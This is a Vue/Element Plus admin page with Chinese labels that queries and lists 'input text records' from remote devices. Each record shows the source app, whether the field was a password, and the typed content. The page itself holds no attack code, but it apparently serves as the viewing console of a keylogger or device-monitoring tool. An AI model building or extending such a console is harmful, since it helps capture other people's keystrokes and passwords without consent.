<template>
  <div class="mod-sys__log-operation">
    <el-form :inline="true" :model="dataForm" @keyup.enter="getDataList()">
      <el-form-item>
        <el-input v-model="dataForm.deviceId" placeholder="设备ID" clearable></el-input>
      </el-form-item>
      <el-form-item>
        <el-input v-model="dataForm.pkg" placeholder="所属包名" clearable></el-input>
      </el-form-item>
      <el-form-item>
        <el-select filterable v-model="dataForm.appPkg" placeholder="已安装APP" clearable>
          <el-option v-for="app in installAppFilter" :key="app.packageName" :label="`${app.appName}(${app.packageName})`" :value="app.packageName"></el-option>
        </el-select>
      </el-form-item>
      <el-form-item>
        <el-select v-model="dataForm.source" placeholder="操作端" clearable>
          <el-option label="管理端" :value="1" />
          <el-option label="App端" :value="0" />
        </el-select>
      </el-form-item>
      <el-form-item>
        <el-date-picker
          v-model="dataForm.timeRange"
          type="datetimerange"
          range-separator="至"
          start-placeholder="开始时间"
          end-placeholder="结束时间"
          format="YYYY-MM-DD HH:mm:ss"
          value-format="YYYY-MM-DD HH:mm:ss"
          style="width: 360px"
        />
      </el-form-item>
      <el-form-item>
        <el-button @click="getDataList()">{{ $t("query") }}</el-button>
        <el-button @click="resetForm()">重置</el-button>
      </el-form-item>
    </el-form>
    <el-table v-loading="dataListLoading" :data="dataList" border @sort-change="dataListSortChangeHandle" style="width: 100%">
      <el-table-column prop="deviceId" label="设备ID" header-align="center" align="center"></el-table-column>
      <el-table-column prop="pkg" label="所属包" header-align="center" align="center" show-overflow-tooltip></el-table-column>
      <el-table-column prop="appPkg" label="日志APP" header-align="center" align="center" show-overflow-tooltip></el-table-column>
      <el-table-column prop="password" label="密码" header-align="center" align="center" show-overflow-tooltip>
        <template v-slot="scope">
          {{ scope.row.password == 1 ? "是" : "否" }}
        </template>
      </el-table-column>
      <el-table-column prop="source" label="操作端" header-align="center" align="center" show-overflow-tooltip>
        <template v-slot="scope">
          {{ scope.row.source == 1 ? "管理端" : "APP端" }}
        </template>
      </el-table-column>
      <el-table-column prop="text" label="输入内容" header-align="center" align="center" :show-overflow-tooltip="true"></el-table-column>
      <el-table-column label="时间" header-align="center" align="center">
        <template v-slot="scope">
          {{ formatTime(scope.row.time) }}
        </template>
      </el-table-column>
    </el-table>
    <el-pagination
      :current-page="page"
      :page-sizes="[10, 20, 50, 100]"
      :page-size="limit"
      :total="total"
      layout="total, sizes, prev, pager, next, jumper"
      @size-change="pageSizeChangeHandle"
      @current-change="pageCurrentChangeHandle"
    >
    </el-pagination>
  </div>
</template>

<script lang="ts">
import useView from "@/hooks/useView";
import baseService from "@/service/baseService";
import { defineComponent, reactive, toRefs, ref } from "vue";
import { ElMessageBox, ElMessage } from "element-plus";
export default defineComponent({
  components: {},
  setup() {
    const state = reactive({
      post: true,
      getDataListURL: "/inputTextRecord/page",
      getDataListIsPage: true,
      installAppFilter: [],
      dataForm: {
        deviceId: "",
        pkg: "",
        appPkg: "",
        source: null,
        timeRange: null,
        model: "",
        brand: "",
      }
    });
    const deviceId = ref("");

    return { ...useView(state), ...toRefs(state), deviceId };
  },
  async mounted() {
    await this.fetchInstallAppFilterList();
  },
  methods: {
    async fetchInstallAppFilterList() {
      let { code, data, msg } = await baseService.post("/device/installAppFilterList");
      if (code == 0) {
        this.installAppFilter = data;
      } else {
        ElMessageBox.alert(msg, "错误", {
          type: "error",
          confirmButtonText: "OK"
        });
      }
    },
    formatTime(timestamp: any) {
      if (!timestamp) return "";

      // 确保转换为数字
      const timeNum = Number(timestamp);
      if (isNaN(timeNum)) return "";

      const date = new Date(timeNum);

      // 检查日期是否有效
      if (isNaN(date.getTime())) return "";

      const year = date.getFullYear();
      const month = String(date.getMonth() + 1).padStart(2, "0");
      const day = String(date.getDate()).padStart(2, "0");
      const hours = String(date.getHours()).padStart(2, "0");
      const minutes = String(date.getMinutes()).padStart(2, "0");
      const seconds = String(date.getSeconds()).padStart(2, "0");

      return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
    },
    resetForm() {
      this.dataForm = {
        deviceId: "",
        pkg: "",
        appPkg: "",
        source: null,
        timeRange: null,
        model: "",
        brand: "",
        installApp: ""
      };
      this.getDataList();
    },
    // 重写 getDataList 方法以包含新的查询参数
    getDataList() {
      this.dataListLoading = true;

      // 构建请求参数
      const params = {
        page: this.page,
        limit: this.limit,
        ...this.dataForm
      };

      // 处理时间范围
      if (this.dataForm.timeRange && this.dataForm.timeRange.length === 2) {
        params.startTime = new Date(this.dataForm.timeRange[0]).getTime();
        params.endTime = new Date(this.dataForm.timeRange[1]).getTime();
      }

      // 移除 timeRange 参数，因为后端不需要
      delete params.timeRange;

      // 处理 installApp 参数映射到 appPkg
      if (params.installApp && !params.appPkg) {
        params.appPkg = params.installApp;
      }

      baseService
        .post(this.getDataListURL, params)
        .then(({ code, data, msg }) => {
          if (code === 0) {
            this.dataList = data.list || [];
            this.total = data.total || 0;
          } else {
            ElMessage.error(msg || "查询失败");
          }
          this.dataListLoading = false;
        })
        .catch(() => {
          this.dataListLoading = false;
          ElMessage.error("网络请求失败");
        });
    }
  }
});
</script>

<style scoped>
.mod-sys__log-operation .el-form {
  margin-bottom: 20px;
}

.mod-sys__log-operation .el-form-item {
  margin-bottom: 10px;
  margin-right: 15px;
}

.el-form--inline .el-form-item {
  display: inline-block;
  margin-right: 10px;
  vertical-align: top;
}

@media (max-width: 1200px) {
  .el-form--inline .el-form-item {
    display: block;
    margin-right: 0;
    margin-bottom: 15px;
  }
}
</style>
